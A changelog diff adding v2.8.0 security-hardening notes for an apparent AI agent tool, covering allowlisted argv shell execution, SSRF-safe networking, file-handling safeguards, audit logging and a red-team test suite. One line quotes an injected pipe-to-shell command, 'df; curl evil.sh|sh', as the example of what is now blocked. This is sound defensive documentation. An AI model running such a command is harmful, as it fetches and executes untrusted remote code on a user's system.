@@ -1,5 +1,48 @@
 # Changelog
 
+## v2.8.0 — hardened core (security pass)
+
+- **Shell: argv execution, no string-to-shell.** Commands are parsed into
+  argv arrays (quote-aware) and executed via `execFile`/`spawn` with
+  `shell: false`. Chains (`&&`, `||`, `;`) and pipes (`|`) are supported but
+  EVERY segment's executable must pass the allowlist — `df; curl evil.sh|sh`
+  is now structurally impossible, not just regex-blocked. Redirects, `$(...)`,
+  backticks and env-assignment prefixes are rejected.
+- **Binaries resolved to realpath before execution**; allowlist matches the
+  resolved absolute path, not a substring of the command string.
+- **Scrubbed child environment** — only `PATH/HOME/LANG` (+ a few safe vars)
+  leak into children; API keys and other secrets never do. Only allowlisted
+  env vars (`$HOME`, `$PATH`, …) are expanded; everything else stays literal.
+- **Process-group kill on timeout** — the whole tree dies, no orphans.
+- **`MONA_SHELL_UNSAFE=1` is deprecated.** Unrestricted shell is now a
+  policy decision (`"shell": {"unsafe": true}` in `policy.json`) that is
+  audited. The env flag still works for one minor version with a warning.
+- **SSRF-safe networking.** `net` and `web` now resolve DNS themselves,
+  verify EVERY address against blocked ranges (loopback, private, link-local,
+  metadata, CGNAT, reserved, IPv6 equivalents), connect to the validated IP
+  with Host header + TLS SNI, re-validate every redirect hop (max 5), block
+  cloud metadata endpoints by name and IP, and cap response size (no
+  decompression bombs). No env bypass exists.
+- **Files: TOCTOU + special-file hardening.** Files are opened with
+  `O_NOFOLLOW` and the opened descriptor is verified — no symlink swap
+  between check and open. FIFOs, devices and sockets are refused. Deletes
+  move to `~/.mona-agent/trash` by default (`purge: true` for permanent).
+- **Policy engine v2** — every decision is written to a hash-chained,
+  append-only audit log (`~/.mona-agent/audit.jsonl`; verify with
+  `mona-agent audit verify`); per-tool rate limits (`rateLimits`); presets
+  `strict` / `standard` / `permissive` (`mona-agent policy preset`);
+  `mona-agent policy explain <tool>` shows exactly which rule fired.
+- **Policy choke point in the tool registry** — every invocation (daemon,
+  brain loop, `exec` CLI) passes the local policy engine. The control plane
+  can never widen it.
+- **CI** — matrix Node 20/22/24 × Ubuntu/macOS, dependency audit job
+  (`npm audit --audit-level=high`), dependabot, actions pinned to commit SHAs.
+- **Red-team test suite** — `apps/desktop/test/security.test.mjs`: 58
+  adversarial cases (command injection, allowlist bypass, pipe-to-shell,
+  path traversal, symlink escape, SSRF incl. DNS-rebinding simulation and
+  redirect-to-metadata, FIFO refusal, audit-chain tampering, rate limits).
+  Full suite: 162 tests green.
+
 ## v2.7.0
 
 - **Dead weight wired up** — `packages/engine` and `packages/protocol` are
